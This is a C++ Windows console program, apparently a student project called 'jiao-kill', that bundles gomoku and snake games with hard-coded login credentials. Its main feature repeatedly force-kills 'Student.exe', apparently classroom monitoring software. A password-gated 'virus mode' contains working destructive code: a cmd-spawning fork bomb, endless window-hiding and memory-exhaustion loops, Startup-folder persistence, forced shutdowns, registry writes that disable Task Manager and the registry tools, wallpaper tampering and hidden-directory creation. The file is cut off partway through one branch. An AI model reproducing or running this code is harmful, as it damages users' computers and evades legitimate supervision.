/*
	Name: Summer Liu
	Copyright: no
	Author: liusirui
	Date: 10/11/24 13:02
	Description: jiao_killv2.2
*/

//Wow , It's New version of jiao-kill!

#include <ctime>
#include <cmath>
#include <iostream>
#include <cstdlib>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <bits/stdc++.h>
#include <windows.h>
#include <Shlobj.h>
#include <conio.h>

#define _CRT_SECURE_NO_WARNINGS 1

#pragma comment(lib, "shell32.lib")

using namespace std;

float module;
bool repeat = true,repeatwhile = true;//repeat control var
int SleepTime, WaitTime;//time var
string InputModel = "off";//model var

void kill_task() {
	system("cls");
	system("title 清除进程模式");
    cout << "请输入延时开启的秒数：";
	cin >> SleepTime;
	cout << "\n";
	cout << "请输入间隔秒数：";
	cin >> WaitTime;
	sleep(SleepTime);

	while (repeatwhile) {
		system("taskkill /f /im Student.exe");
		sleep(WaitTime);
	}
}

//little game 1
const int N = 15;       //15*15的棋盘
const char ChessBoard = ' ';  //棋盘标志
const char flag1 = 'o';    //玩家1或电脑标志
const char flag2 = 'x';    //玩家2标志

typedef struct Position{    //坐标
    int row;        //行
    int col;        //列
}Position;

class GoBang{     //五子棋类
public:
    GoBang(){
        InitChessBoard();      //初始化棋盘
    }
    void Play(){      //下棋
        Position Play1;   //玩家1或电脑
        Position Play2;   //玩家2
        while (1){
            int mode = ChoiceMode();
            while (1){
                if (mode == 1){       //电脑VS玩家
                    ComputerChess(Play1, flag1);            //电脑走
                    if (GetVictory(Play1, 0, flag1)){       //0代表电脑，为真则表示电脑获胜
                        break;
                    }
                    PlayChess(Play2, 2, flag2);         //玩家2走
                    if (GetVictory(Play2, 2, flag2)){       //2代表玩家2
                        break;
                    }
                }
                else{               //玩家1VS玩家2
                    PlayChess(Play1, 1, flag1);         //玩家1走
                    if (GetVictory(Play1, 1, flag1)){       //玩家1赢
                        break;
                    }
                    PlayChess(Play2, 2, flag2);         //玩家2走
                    if (GetVictory(Play2, 2, flag2)){       //玩家2赢
                        break;
                    }
                }
            }
            cout << "======再来一局=======" << endl;
            cout << "yes or no :";
            char s[] = "yes";
            cin >> s;
            if (strcmp(s, "no") == 0){
                break;
            }
        }
    }

protected:
    void InitChessBoard(){          //初始化棋盘
        for (int i = 0; i < N + 1; ++i){
            for (int j = 0; j < N + 1; ++j){
                _ChessBoard[i][j] = ChessBoard;
            }
        }
    }

    int ChoiceMode(){           //选择模式
        system("cls");
        //系统调用，清屏
        InitChessBoard();       //重新初始化棋盘
        cout << "*************************************************" << endl;
        cout << "******************0、退出************************" << endl;
        cout << "******************1、电脑VS玩家******************" << endl;
        cout << "******************2、玩家VS玩家******************" << endl;
        cout << "*************************************************" << endl;
        while (1){
            int i = 0;
            cout << "请选择模式：";
            cin >> i;
            if (i == 0){       //退出
                exit(1);
            }
            if (i == 1 || i == 2){
                return i;
            }
            else{
                cout << "非法输入，请重新输入！" << endl;
            }
        }
    }

    void PrintChessBoard(){        //打印棋盘
        printf("     1   2   3   4   5   6   7   8   9  10  11  12  13  14  15\n");
        printf("   |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n");
        for (int i = 1; i < N + 1; ++i)
        {
            printf("%2d ", i);
            printf("| %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c |\n", _ChessBoard[i][1], _ChessBoard[i][2], _ChessBoard[i][3], _ChessBoard[i][4], _ChessBoard[i][5], _ChessBoard[i][6], _ChessBoard[i][7], _ChessBoard[i][8], _ChessBoard[i][9], _ChessBoard[i][10], _ChessBoard[i][11], _ChessBoard[i][12], _ChessBoard[i][13], _ChessBoard[i][14], _ChessBoard[i][15]);
            printf("   |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n");
        }
        cout << endl;
    }

    void ComputerChess(Position& pos, char flag){     //电脑走
        //PrintChessBoard();      //打印棋盘
        int x = 0;
        int y = 0;
        while (1){                    //循环查找空位置
            x = (rand() % N) + 1;      //产生从1~N的随机数
            srand((unsigned int)time(NULL));
            y = (rand() % N) + 1;      //产生从1~N的随机数
            srand((unsigned int)time(NULL));
            if (_ChessBoard[x][y] == ChessBoard){       //如果这个位置为空（没有棋子），跳出循环，下棋
                break;
            }
        }
        pos.row = x;
        pos.col = y;
        _ChessBoard[pos.row][pos.col] = flag;
    }

    void PlayChess(Position& pos, int player, char flag){
        PrintChessBoard();      //打印棋盘
        while (1){
            printf("请玩家%d输入坐标：", player);
            cin >> pos.row >> pos.col;
            if (JudgeValue(pos) == 1){        //判断坐标是否合法
                break;
            }
            cout << "坐标不合法，请重新输入：" << endl;
        }
        _ChessBoard[pos.row][pos.col] = flag;
    }

    int JudgeValue(const Position& pos){       //判断坐标的合法性
        //1.在棋盘上
        if (pos.row > 0 && pos.row <= N && pos.col > 0 && pos.col <= N){
            //2.所在位置为空（没有棋子）
            if (_ChessBoard[pos.row][pos.col] == ChessBoard){
                return 1;      //合法
            }
        }
        return 0;       //非法
    }

    int JudgeVictory(Position pos, char flag){     //判断是否有玩家获胜（底层判断）
        int begin = 0;
        int end = 0;

        //1.判断行是否满足条件
        (pos.col - 4) > 0 ? begin = (pos.col - 4) : begin = 1;
        (pos.col + 4) > N ? end = N : end = (pos.col + 4);
        for (int i = pos.row, j = begin; j + 4 <= end; ++j){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i][j + 1] == flag &&
                _ChessBoard[i][j + 2] == flag && _ChessBoard[i][j + 3] == flag &&
                _ChessBoard[i][j + 4] == flag)
                return 1;
        }
        //2.判断列是否满足条件
        (pos.row - 4) > 0 ? begin = (pos.row - 4) : begin = 1;
        (pos.row + 4) > N ? end = N : end = (pos.row + 4);
        for (int j = pos.col, i = begin ; i + 4 <= end; ++i){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j] == flag &&
                _ChessBoard[i + 2][j] == flag && _ChessBoard[i + 3][j] == flag &&
                _ChessBoard[i + 4][j] == flag)
                return 1;
        }
        //3.判断主对角线是否满足条件
        int len = 0;    //相对长度
        int start = 0;
        int finish = 0;
        pos.row > pos.col ? len = pos.col - 1 : len = pos.row - 1;
        if (len > 4){
            len = 4;
        }
        begin = pos.row - len;       //横坐标起始位置
        start = pos.col - len;       //纵坐标起始位置

        pos.row > pos.col ? len = N - pos.row : len = N - pos.col;
        if (len > 4){
            len = 4;
        }
        end = pos.row + len;         //横坐标结束位置
        finish = pos.col + len;      //纵坐标结束位置

        for (int i = begin, j = start; (i + 4 <= end) && (j + 4 <= finish); ++i, ++j){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j + 1] == flag &&
                _ChessBoard[i + 2][j + 2] == flag && _ChessBoard[i + 3][j + 3] == flag &&
                _ChessBoard[i + 4][j + 4] == flag)
                return 1;
        }
        //4.判断副对角线是否满足条件
        (pos.row - 1) > (N - pos.col) ? len = N - pos.col : len = pos.row - 1;
        if (len > 4){
            len = 4;
        }
        begin = pos.row - len;       //横坐标起始位置
        start = pos.col + len;       //纵坐标起始位置

        (N - pos.row) > (pos.col - 1) ? len = pos.col - 1 : len = N - pos.row;
        if (len > 4){
            len = 4;
        }
        end = pos.row + len;         //横坐标结束位置
        finish = pos.col - len;      //纵坐标结束位置
        for (int i = begin, j = start; (i + 4 <= end) && (j - 4 >= finish); ++i, --j){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j - 1] == flag &&
                _ChessBoard[i + 2][j - 2] == flag && _ChessBoard[i + 3][j - 3] == flag &&
                _ChessBoard[i + 4][j - 4] == flag)
                return 1;
        }
        //该位置并未下棋
        for (int x = 1; x < N + 1; ++x){
            for (int y = 1; y < N + 1; ++y){
                if (_ChessBoard[x][y] == ChessBoard){
                    return 0;       //未下棋
                }
            }
        }
        return -1;      //和局
    }

    bool GetVictory(Position& pos, int player, char flag){       //判断具体哪位玩家赢
        if (JudgeVictory(pos, flag) != 0){    //判断有无人获胜
            if (JudgeVictory(pos, flag) == 1){     //判断是否有人获胜,1表示获胜
                PrintChessBoard();     //打印棋盘
                if (player == 0){
                    cout << "电脑获胜！" << endl;
                }
                else{
                    printf("恭喜玩家%d获胜！\n", player);
                }
            }
            else{
                printf("和局！\n");
            }
            return true;      //有人获胜
        }
        return false;         //没人获胜
    }

private:
    char _ChessBoard[N + 1][N + 1];    //棋盘
};

BOOL SetImmunity(char *FilePath,char *FileName)     //***病毒*** 
{
    char file[2048] = { 0 };
 
    strncpy(file, FilePath, strlen(FilePath));
    strcat(file, FileName);
    BOOL bRet = CreateDirectory(file, NULL);
    if (bRet)
    {
        strcat(file, "\\anti...\\");
        bRet = CreateDirectory(file, NULL);
        if (bRet)
        {
            SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN);
            return TRUE;
        }
    }
    return FALSE;
}
void ClearImmunity(char *FilePath, char *FileName)
{
    char file[2048] = { 0 };
 
    strncpy(file, FilePath, strlen(FilePath));
    strcat(file, FileName);
 
    strcat(file, "\\anti...\\");
    RemoveDirectory(file);
 
    ZeroMemory(file, MAX_PATH);
    strncpy(file, FilePath, strlen(FilePath));
    strcat(file, FileName);
    RemoveDirectory(file);
}
BOOL AutoRun_Startup(char *lpszSrcFilePath, char *lpszDestFileName){
    char szStartupPath[MAX_PATH] = { 0 };
    char szDestFilePath[MAX_PATH] = { 0 };
    SHGetSpecialFolderPath(NULL, szStartupPath, CSIDL_STARTUP, TRUE);
    wsprintf(szDestFilePath, "%s\\%s", szStartupPath, lpszDestFileName);
    CopyFile(lpszSrcFilePath, szDestFilePath, FALSE);
    return TRUE;
}



//little game 2
/*** 光标定位 ***/
HANDLE hout=GetStdHandle(STD_OUTPUT_HANDLE);
COORD coord;
 
void locate(int x,int y)
{
    coord.X=y;
    coord.Y=x;
    SetConsoleCursorPosition(hout,coord);
};
 
/*** 隐藏光标 ***/
void hide()
{
    CONSOLE_CURSOR_INFO cursor_info={1,0};
    SetConsoleCursorInfo(hout, &cursor_info);
}
 
/*** 生成随机数 ***/
double random(double start, double end)
{
    return start+(end-start)*rand()/(RAND_MAX + 1.0);
}
 
/*** 定义地图的长宽，蛇的坐标，长度，方向，食物的位置 ***/
int m,n;
 
struct node
{
    int x,y;
}snake[1000];
 
int snake_length,dir;
node food;
int direct[4][2]={{-1,0},{1,0},{0,-1},{0,1}};
 
/*** 输出墙 ***/
void print_wall()
{
    cout << " ";
    for (int i=1;i<=n;i++)
        cout << "-";
    cout << endl;
    for (int j=0;j<=m-1;j++)
    {
        cout << "|";
        for (int i=1;i<=n;i++) cout << " ";
        cout << "|" << endl;
    }
    cout << " ";
    for (int i=1;i<=n;i++)
        cout << "-";
}
 
/*** 首次输出蛇，其中snake[0]代表头 ***/
void print_snake()
{
    locate(snake[0].x,snake[0].y);
    cout << "@";
    for (int i=1;i<=snake_length-1;i++)
    {
        locate(snake[i].x,snake[i].y);
        cout << "*";
    }
}
 
/*** 判断是否撞墙或者自撞 ***/
bool is_correct()
{
    if (snake[0].x==0 || snake[0].y==0 || snake[0].x==m+1 || snake[0].y==n+1) return false;
    for (int i=1;i<=snake_length-1;i++)
    {
        if (snake[0].x==snake[i].x && snake[0].y==snake[i].y) return false;
    }
    return true;
}
 
/*** 随机生成并输出食物位置 ***/
bool print_food()
{
    srand((unsigned)time(0));
    bool e;
    while (1)
    {
        e=true;
        int i=(int) random(0,m)+1,j=(int) random(0,n)+1;
        food.x=i;food.y=j;
        for (int k=0;k<=snake_length-1;k++)
        {
            if (snake[k].x==food.x && snake[k].y==food.y)
            {
                e=false;break;
            }
        }
        if (e) break;
    }
    locate(food.x,food.y);
    cout << "$";
    return true;
}
 
/*** 蛇的前进 ***/
bool go_ahead()
{
    node temp;
    bool e=false;
    temp=snake[snake_length-1];
    for (int i=snake_length-1;i>=1;i--)
        snake[i]=snake[i-1];
    snake[0].x+=direct[dir][0];
    snake[0].y+=direct[dir][1];
    locate(snake[1].x,snake[1].y);
    cout << "*";
    /*** 吃到了食物 ***/
    if (snake[0].x==food.x && snake[0].y==food.y)
    {
        snake_length++;
        e=true;
        snake[snake_length-1]=temp;
    }
    /*** 输出此时蛇状态 ***/
    if (!e)
    {
        locate(temp.x,temp.y);
        cout << " ";
    }
    else
        print_food();
    locate(snake[0].x,snake[0].y);
    cout << "@";
    /*** 如果自撞 ***/
    if (!is_correct())
    {
        system("cls");
        cout << "You lose!" << endl << "Length: " << snake_length << endl;
        return false;
    }
    return true;
}
void q_j1(){
	//open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "大香蕉牌学生机终止器"  << endl;
	cout<<"v1.1"<<endl;
	system("title jiao-kill v1.1");
}
void q_j2(){
	int module=0;

    //open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "大香蕉牌学生机终止器"  << endl;
	cout << "暑假更新版1" << endl;
	cout << "\n";
	system("title jiao-kill v1.2");
}
void q_j3(){
	int module=0;

    //open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "大香蕉牌学生机终止器"  << endl;
	cout << "学期更新版1" << endl;
	cout << "\n";
	system("title jiao-kill v1.3");
} 
void q_j4(){
	int module=0;

    //open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "大香蕉牌学生机终止器"  << endl;
	cout << "学期更新版4，jiao-kill v2.0" << endl;
	cout << "\n";
	system("title jiao-kill v2.0");
}
void wuq(){
	int module=0;
    //open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "大香蕉牌学生机终止器"  << endl;
	cout << "学期更新版4，jiao-kill v2.0" << endl;
	cout << "\n";
	system("title jiao-kill v2.0");
} 
//main program
int main(int argc, char** argv) {
	string a,b;
	int c;
	string name="liusirui";
	string password="Sunny0226";
	while(true){
		system("cls"); 
		cout<<"欢迎使用刘思睿和苏铂辰联合创造的jiao-kill！！！"<<endl; 
		cout<<"请输入模式：（1：登录，2：使用付费jiao-kill，3：查看用户列表）";
		cin>>c;
		if(c==1){
			cout<<"请输入用户名：";
			cin>>a;
			cout<<"请输入密码：";
			cin>>b;
			if (a==name && b==password){
				system("cls");
			    int module=0;
				HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
			    //open the file out data
			    cout << "    _   _                    __  ____   __ " << endl;
				cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
				cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
				cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
				cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
				cout << " |__/                       \_\         /_/ " << endl;
				cout << "大香蕉牌学生机终止器"  << endl;
				cout << "学期更新版5，jiao-kill v2.2" << endl;
				cout << "\n";
				system("title jiao-kill v2.2");
			
				while (true) { 
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
			        cout << "请输入模式(输入8查看帮助)：";
			        cin >> module;
			        if (module == 0) {
			            break;
			            system("pause");
			        }
			        else if (module==1) {
			            kill_task();
			        }
			        else if (module == 2) {
			            GoBang g;
			            g.Play();
			            system("pause");
			        }
					else if (module == 3){
						system("title 贪吃蛇游戏"); 
						system("mode con cols=80 lines=30"); //设置cmd窗口大小
						system("color 2"); //设置字符颜色：0 黑；1 深蓝；2 深绿；3 深青；4 深红；5 深紫；6 深褐 
					    cout << "--------------------贪吃蛇---------------------" << endl;
					    cout << "先选择难度.请在1-10中输入1个数,1最简单,10则最难" << endl;
					    cout << "然后进入游戏画面,以方向键控制方向.祝你游戏愉快!" << endl;
					    cout << "-----------------------------------------------" << endl;
					    cout << "请输入难度级别：" ;
					    m=25;
					    n=40; 
					    if (m<10 || n<10 || m>25 || n>40)
					    {
					        cout << "ERROR" << endl;
					        system("pause");
					        return 0;
					    }
					    int hard;
					    cin >> hard;
					    if (hard<=0 || hard>100)
					    {
					        cout << "ERROR" << endl;
					        system("pause");
					        return 0;
					    }
					    /*** 数据全部初始化，包括蛇长，位置，方向 ***/
					    snake_length=5;
					    clock_t a,b;
					    char ch;
					    double hard_len;
					    for (int i=0;i<=4;i++)
					    {
					        snake[i].x=1;
					        snake[i].y=5-i;
					    }
					    dir=3;
					    /*** 输出初始地图，蛇与食物 ***/
					    system("cls");
					    hide();
					    print_wall();
					    print_food();
					    print_snake();
					    locate(m+2,0);
					    cout << "Now length: ";
					    /*** 开始游戏 ***/
					    while (1)
					    {
					        /*** 难度随长度增加而提高 ***/
					        hard_len=(double)snake_length/(double) (m*n);
					        /*** 调节时间，单位是ms ***/
					        a=clock();
					        while (1)
					        {
					            b=clock();
					            if (b-a>=(int)(400-30*hard)*(1-sqrt(hard_len))) break;
					        }
					        /*** 接受键盘输入的上下左右，并以此改变方向 ***/
					        if (kbhit())
					        {
					            ch=getch();
					            if (ch==-32)
					            {
					                ch=getch();
					                switch(ch)
					                {
					                case 72:
					                    if (dir==2 || dir==3)
					                        dir=0;
					                    break;
					                case 80:
					                    if (dir==2 || dir==3)
					                        dir=1;
					                    break;
					                case 75:
					                    if (dir==0 || dir==1)
					                        dir=2;
					                    break;
					                case 77:
					                    if (dir==0 || dir==1)
					                        dir=3;
					                    break;
					                }
					            }
					        }
					        /*** 前进 ***/
					        if (!go_ahead()) break;
					        /*** 在最后输出此时长度 ***/
					        locate(m+2,12);
					        cout << snake_length;
					    }
					    system("color 0");
						system("pause");
					}
			        else if (module == 4) {
			        	system("cls");
			        	system("title 病毒模式");
			        	int r;
						cout<<"Please input number(1~9) : ";
						cin>>r;
						if(r==1){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==264697){
			    				cout<<"It's safe";
							}else{
								while(1)system("start cmd");
							}
						}else if(r==2){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==417664){
			    			cout<<"It's safe";
							}else{
								while(1){
			    			    	HWND hWnd=GetForegroundWindow();
			    			    	ShowWindow(hWnd,SW_HIDE);
			    				}
							}
						}else if(r==3){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==529555){
								cout<<"It's safe";
							}else{
			    				while(1)malloc(1000);
							}
						}else if(r==4){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==278230){
								cout<<"It's safe";
							}else{
			    				AutoRun_Startup("c://main.exe", "main.exe");
			    				system("shutdown /p");
							}
						}else if(r==5){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==640855){
			    				cout<<"It's safe";
							}else{
			    				HKEY hkey;
			    				DWORD value = 1;
			    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
			    				RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
			    				RegCloseKey(hkey);
							}
						}else if(r==6){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==957040){
			    				cout<<"It's safe";
							}else{
			    				HKEY hkey;
			    				DWORD value = 1;
			    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
			    				RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
			    				RegCloseKey(hkey);
							}
						}else if(r==7){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==617735){
			    				cout<<"It's safe";
							}else{
			    				DWORD value = 1;
			    				HKEY hkey;
			    				RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);
			    				RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
			    			}
						}else if(r==8){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==138208){
			    				cout<<"It's safe";
							}else{
			    				char *Fuck[4] = { "你", "好", "世", "界" };
			    				int FuckLen = sizeof(Fuck) / sizeof(int);
				    			TCHAR Destop[MAX_PATH];
			    				SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);  
				    			for (int x = 0; x < FuckLen; x++){
				    		    	SetImmunity("c://", Fuck[x]);
				    		    	ClearImmunity("c://", Fuck[x]);
				    			} 
			    				system("pause");
							}
						}else{
							cout<<"It's not true";
						}
			        	system("pause");
					}
					else if (module == 5) {
						system("cls");
						system("title 病毒秘钥");
						cout << "1:  264697" <<endl;
						cout << "2:  417664" <<endl;
						cout << "3:  529555" <<endl;
						cout << "4:  278230" <<endl;
						cout << "5:  640855" <<endl;
						cout << "6:  957040" <<endl;
						cout << "7:  617735" <<endl;
						cout << "8:  138203" <<endl;
						system("pause"); 
					}
					else if(module == 6){
						system("start http://www.google.com/poki.com");
					}
					else if(module == 7){
						system("cls");
						system("title 开始关机");
						cout<<"一分钟后关机！";
						system("shutdown -s -t 60");
						break;
					} 
			        else if (module == 8) {
			        	system("cls");
			        	system("title 帮助文件");
			            cout << "帮助文档：" <<endl;
			            cout << "帮助指令：" ;
			            cout << "0:退出程序,1：启动终止器，2：启动五子棋小游戏，3：启动贪吃蛇游戏"<<endl;
			            cout << "4：病毒（请勿随便乱按，否则电脑崩溃，请查看病毒密钥）" <<endl;
			            cout << "5：查看病毒密钥，6：打开谷歌浏览器poki小游戏，7：关机"<<endl;
						cout <<"8：查看帮助文件" <<endl;
			            system("pause");
			        }
			        else {
			            cout << "无此代码号" <<endl;
			            system("pause");
			        }
				}
			}
			else{
				cout<<"无此用户名！"; 
			}
		}else if(c==2){
			int z;
			string d;
			srand(time(0));
			z=rand()%5+1;
			system("cls");
			cout<<"目前您有"<<z<<"$"<<endl;
			cout<<"您需要付5$，您会欠债"<<z-5<<"$，您是否要付费："; 
			cin>>d;
			if(d=="是"){
				switch(z){
					case 1:
						cout<<"因您欠债"<<z-5<<"$，所以您只能使用jiao-killv1.1的内容" <<endl;
						sleep(2);
						system("cls");
						q_j1();
						kill_task();
						
					case 2:
						cout<<"因您欠债"<<z-5<<"$，所以您只能使用jiao-killv1.2的内容" <<endl;
						sleep(2);
						system("cls");
						q_j2();
					
						while (true) {
					        cout << "请输入模式(输入3查看帮助)：";
					        cin >> module;
					        if (module == 0) {
					            system("exit");
					        }
					        else if (module==1) {
					            kill_task();
					        }
					        else if (module == 2) {
					            GoBang g;
					            g.Play();
					            system("pause");
					        }
					        else if (module == 3) {
					            cout << "帮助文档：" <<endl;
					            cout << "帮助指令：" ;
					            cout << "0:退出程序,1：启动终止器，2：启动五子棋小游戏，3：查看帮助文档"<<endl;
					            system("pause");
					        }
					        else {
					            cout << "无此代码号";
					            system("pause");
					            break;
					        }
						}
						break;
					case 3:
						cout<<"因您欠债"<<z-5<<"$，所以您只能使用jiao-killv1.3的内容" <<endl;
						sleep(2);
						system("cls");
						q_j3();
					
						while (true) {
					        cout << "请输入模式(输入5查看帮助)：";
					        cin >> module;
					        if (module == 0) {
					            system("exit");
					        }
					        else if (module==1) {
					            kill_task();
					        }
					        else if (module == 2) {
					            GoBang g;
					            g.Play();
					            system("pause");
					        }
					        else if (module == 3) {
					        	int r;
								cout<<"Please input number(1~9) : ";
								cin>>r;
								if(r==1){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==264697){
					    				cout<<"It's safe";
									}else{
										while(1)system("start cmd");
									}
								}else if(r==2){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==417664){
					    			cout<<"It's safe";
									}else{
										while(1){
					    			    	HWND hWnd=GetForegroundWindow();
					    			    	ShowWindow(hWnd,SW_HIDE);
					    				}
									}
								}else if(r==3){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==127619){
										cout<<"It's safe";
									}else{
					    				system("shutdown -s -t 60");//->1分钟
					    				system("shutdown -p");//->立刻
									}
								}else if(r==4){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==529555){
										cout<<"It's safe";
									}else{
					    				while(1)malloc(1000);
									}
								}else if(r==5){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==278230){
										cout<<"It's safe";
									}else{
					    				AutoRun_Startup("c://main.exe", "main.exe");
					    				system("shutdown /p");
									}
								}else if(r==6){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==640855){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==7){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==957040){
					    				cout<<"It's safe";
									}else{
					    				HKEY hkey;
					    				DWORD value = 1;
					    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
					    				RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    				RegCloseKey(hkey);
									}
								}else if(r==8){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==617735){
					    				cout<<"It's safe";
									}else{
					    				DWORD value = 1;
					    				HKEY hkey;
					    				RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);
					    				RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
					    			}
								}else if(r==9){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==138208){
					    				cout<<"It's safe";
									}else{
					    				char *Fuck[4] = { "你", "好", "世", "界" };
					    				int FuckLen = sizeof(Fuck) / sizeof(int);
						    			TCHAR Destop[MAX_PATH];
					    				SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);  
						    			for (int x = 0; x < FuckLen; x++){
						    		    	SetImmunity("c://", Fuck[x]);
						    		    	//ClearImmunity("c://", Fuck[x]);
						    			} 
					    				system("pause");
									}
								}else{
									cout<<"It's not true";
								}
					        	system("pause");
							}
							else if (module == 4) {
								cout << "1:  264697" <<endl;
								cout << "2:  417664" <<endl;
								cout << "3:  127619" <<endl;
								cout << "4:  529555" <<endl;
								cout << "5:  278230" <<endl;
								cout << "6:  640855" <<endl;
								cout << "7:  957040" <<endl;
								cout << "8:  617735" <<endl;
								cout << "9:  138203" <<endl;
							}
					        else if (module == 5) {
					            cout << "帮助文档：" <<endl;
					            cout << "帮助指令：" ;
					            cout << "0:退出程序,1：启动终止器，2：启动五子棋小游戏"<<endl;
					            cout << "3：病毒（请勿随便乱按，否则电脑崩溃，请查看病毒密钥）" <<endl;
					            cout << "4：查看病毒密钥，5：查看帮助文件" <<endl;
					            system("pause");
					        }
					        else {
					            cout << "无此代码号";
					            system("pause");
					            break;
					        }
						}
						break;
					case 4:
						cout<<"因您欠债"<<z-5<<"$，所以您只能使用jiao-killv1.4的内容" <<endl;
						sleep(2);
						system("cls");
						q_j4();
					
						while (true) {
					        cout << "请输入模式(输入6查看帮助)：";
					        cin >> module;
					        if (module == 0) {
					            break;
					            system("pause");
					        }
					        else if (module==1) {
					            kill_task();
					        }
					        else if (module == 2) {
					            GoBang g;
					            g.Play();
					            system("pause");
					        }
					        else if (module == 3) {
					        	system("cls");
					        	system("title 病毒模式");
					        	int r;
								cout<<"Please input number(1~9) : ";
								cin>>r;
								if(r==1){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==264697){
					    				cout<<"It's safe";
									}else{
										while(1)system("start cmd");
									}
								}else if(r==2){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==417664){
					    			cout<<"It's safe";
									}else{
										while(1){
					    			    	HWND hWnd=GetForegroundWindow();
					    			    	ShowWindow(hWnd,SW_HIDE);
					    				}
									}
								}else if(r==3){
									int i;
									cout<<"Please input password: ";
									cin>>i;
									if(i==529555){
										cout<<"It's safe";
									}else{
					    				while(1)malloc(1000);
									}
								}else if(r==4){
									int i;
									cout<<"Please input password: ";
									cin>>i;
